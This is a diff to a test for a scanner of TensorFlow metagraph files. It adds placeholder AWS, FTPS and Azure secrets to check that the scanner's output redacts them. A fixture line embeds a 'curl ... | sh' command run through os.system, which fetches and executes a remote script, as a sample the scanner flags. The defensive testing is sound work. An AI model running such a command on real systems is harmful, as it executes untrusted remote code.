@@ -476,6 +476,9 @@ def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(
 def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: Path) -> None:
     sensitive_url = "https://example.com/p.sh?X-Amz-Signature=SECRET123&safe=1"
     path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
+    legacy_aws_access_key = "AKIAEXAMPLEACCESSKEY"
+    legacy_signature = "LEGACYSIGNATURE"
+    ftps_password = "FTPSPASSWORD"
     sensitive_command = f"python -c \"import os; os.system('curl {sensitive_url} | sh')\" client_secret=supersecret"
     sensitive_meta = tmp_path / "sensitive-preview.meta"
     sensitive_meta.write_bytes(
@@ -491,6 +494,11 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
                             f"https://storage.googleapis.com/model-bucket/{path_token}/model.so"
                             "?X-Goog-Signature=GCSSECRET"
                         ),
+                        "legacy_aws_path": (
+                            f"ftps://user:{ftps_password}@files.example/{path_token}/model.so"
+                            f"?AWSAccessKeyId={legacy_aws_access_key}&Signature={legacy_signature}"
+                        ),
+                        "azure_path": (f"wasbs://container@account.blob.core.windows.net/{path_token}/model.so"),
                     },
                 }
             ],
@@ -515,8 +523,13 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
     assert "nodesecret" not in serialized_result
     assert "attrsecret" not in serialized_result
     assert "collectionsecret" not in serialized_result
+    assert legacy_aws_access_key not in serialized_result
+    assert legacy_signature not in serialized_result
+    assert ftps_password not in serialized_result
     assert "X-Amz-Signature=<redacted>" in serialized_result
     assert "X-Goog-Signature=<redacted>" in serialized_result
+    assert "AWSAccessKeyId=<redacted>" in serialized_result
+    assert "Signature=<redacted>" in serialized_result
     assert "client_secret=<redacted>" in serialized_result
     assert "token=<redacted>" in serialized_result
     assert "os.system" in serialized_result
